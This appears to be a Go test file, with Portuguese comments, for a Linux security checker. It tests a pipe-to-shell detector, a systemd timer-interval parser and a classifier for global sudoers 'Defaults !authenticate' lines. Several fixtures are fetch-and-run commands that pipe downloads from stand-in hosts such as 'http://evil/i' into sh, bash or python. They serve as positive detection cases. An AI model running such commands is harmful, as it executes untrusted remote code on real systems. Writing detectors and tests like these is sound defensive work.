package checks

import "testing"

// Evasões que zeravam cinco checks de persistência de uma vez: execSuspect é o
// classificador ÚNICO, e pipesToShell casava por prefixo literal ("|sh", "| sh")
// em vez de pelo basename do comando depois do pipe.
func TestPipesToShellCasaPorBasename(t *testing.T) {
	casa := []string{
		"curl -s http://evil/i | /bin/sh",
		"curl -s http://evil/i |/usr/bin/bash",
		"wget -qo- http://x |\tsh",
		"curl x | sudo bash",
		"curl x | env python3",
		`/bin/sh -c "curl -s http://x/a | bash"`,
		"curl x |/usr/local/bin/python3 -",
	}
	naoCasa := []string{
		"/usr/bin/foo || /usr/bin/bar", // operador lógico, não pipe
		"cat a | grep b",
		"ls | wc -l",
		"cmd | tee /var/log/x",
		"echo oi",
	}
	for _, s := range casa {
		if !pipesToShell(s) {
			t.Errorf("deveria casar: %q", s)
		}
	}
	for _, s := range naoCasa {
		if pipesToShell(s) {
			t.Errorf("NÃO deveria casar: %q", s)
		}
	}
}

// A unidade sai da posição ABSOLUTA em hh:mm:ss. Indexar pela distância até o
// fim assumia que o último componente é sempre segundo, e as formas abreviadas
// do systemd — que são as comuns — saíam por um fator de 60.
func TestCalendarIntervalUsaPosicaoAbsoluta(t *testing.T) {
	casos := []struct {
		cal  string
		seg  int
		quer bool
	}{
		{"*:*/30", 1800, true},       // a cada 30 min; era lido como 30 s
		{"*/6:00", 6 * 3600, true},   // a cada 6 h; era lido como 360 s
		{"*:0/5", 300, true},         // grafia N/M; devolvia false
		{"*-*-* *:*:*/10", 10, true}, // forma completa: o último É segundo
		{"*:*/1", 60, true},
		{"minutely", 60, true},
		{"hourly", 3600, true},
		{"*-*-* 03:00:00", 0, false}, // sem repetidor não é intervalo
	}
	for _, c := range casos {
		got, _, ok := calendarInterval(c.cal)
		if ok != c.quer || (ok && got != c.seg) {
			t.Errorf("calendarInterval(%q) = %d,%v — quer %d,%v", c.cal, got, ok, c.seg, c.quer)
		}
	}
}

// `Defaults !authenticate` sem alvo desliga a senha para o host inteiro: é
// NOPASSWD amplo escrito de outra forma, e caía no ramo que imprimia
// "restrita a comando nomeado" — contradizendo a evidência anterior do próprio
// achado, com exit 1 em vez de 2.
func TestDefaultsGlobalDistingueAlvo(t *testing.T) {
	global := []string{
		"Defaults !authenticate",
		"Defaults\t!authenticate",
		"defaults !authenticate, !requiretty",
	}
	restrito := []string{
		"Defaults:alice !authenticate",
		"Defaults@web !authenticate",
		"Defaults>root !authenticate",
		"Defaults!/usr/bin/foo !authenticate",
		"alice ALL=(ALL) NOPASSWD: ALL",
	}
	for _, s := range global {
		if !defaultsGlobal(s) {
			t.Errorf("é global: %q", s)
		}
	}
	for _, s := range restrito {
		if defaultsGlobal(s) {
			t.Errorf("NÃO é global: %q", s)
		}
	}
}
